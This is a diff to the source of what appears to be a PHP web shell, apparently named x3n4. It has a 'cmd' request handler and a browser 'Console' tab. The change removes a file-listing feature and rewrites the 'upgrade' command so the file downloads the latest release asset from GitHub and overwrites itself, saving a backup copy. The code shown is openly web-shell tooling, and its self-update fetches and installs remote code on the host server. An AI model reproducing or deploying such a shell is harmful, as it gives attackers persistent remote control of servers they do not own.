@@ -70,41 +70,6 @@ function is_function_disabled($function)
 {
     return in_array($function, disabled_functions());
 }
-function tree($dir)
-{
-    $ffs = scandir($dir);
-
-    unset($ffs[array_search('.', $ffs, true)]);
-    unset($ffs[array_search('..', $ffs, true)]);
-
-    // prevent empty ordered elements
-    if (count($ffs) < 1) {
-        return;
-    }
-
-    echo '<ol>';
-    foreach ($ffs as $ff) {
-        echo '<li>', $ff;
-        if (is_dir($dir.'/'.$ff)) {
-            tree($dir.'/'.$ff);
-        }
-        echo '</li>';
-    }
-    echo '</ol>';
-}
-function list_folder_files($dir)
-{
-    $files = scandir($dir);
-    $data = array();
-    foreach ($files as $file) {
-        array_push($data, array(
-            'filename' => $file,
-            'type' => is_dir($file) ? 'folder' : 'file',
-            'fullpath' => realpath($file),
-        ));
-    }
-    return $data;
-}
 function output_json($output = '')
 {
     $output_data = array(
@@ -134,14 +99,17 @@ if (isset($_REQUEST['cmd'])) {
     if (empty($REQUESTED_CMD)) {
         exit(0);
     }
-    if ($REQUESTED_CMD == 'dirl') {
-        output_json(list_folder_files('.'));
-    }
     if ($REQUESTED_CMD == 'upgrade') {
         $options  = array('http' => array('user_agent' => 'custom user agent string'));
         $context  = stream_context_create($options);
-        file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
-        file_put_contents(__FILE__, file_get_contents('https://raw.githubusercontent.com/jorge-matricali/x3n4/master/x3n4.php', false, $context));
+        $releases = @json_decode(@file_get_contents('https://api.github.com/repos/jorge-matricali/x3n4/releases', false, $context));
+        if ($releases) {
+            $asset = $releases[0]->assets[0]->browser_download_url;
+            if ($asset) {
+                file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
+                file_put_contents(__FILE__, file_get_contents($asset, false, $context));
+            }
+        }
         output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
         exit(0);
     }
@@ -202,7 +170,6 @@ if (isset($_REQUEST['cmd'])) {
         <ul class="nav nav-tabs" role="tablist">
             <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
             <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
-            <!-- <li role="presentation"><a href="#file-manager" aria-controls="file-manager" role="tab" data-toggle="tab"><i class="fa fa-file-code-o "></i> File manager</a></li> -->
         </ul>
         <p></p>
         <div class="tab-content">
@@ -270,10 +237,6 @@ if (isset($_REQUEST['cmd'])) {
                         </span>
                     </div>
                 </div>
-            </div>
-
-            <div id="file-manager" role="tabpanel" class="tab-pane">
-                <?php list_folder_files(__DIR__); ?>
             </div>
         </div>
     </div>
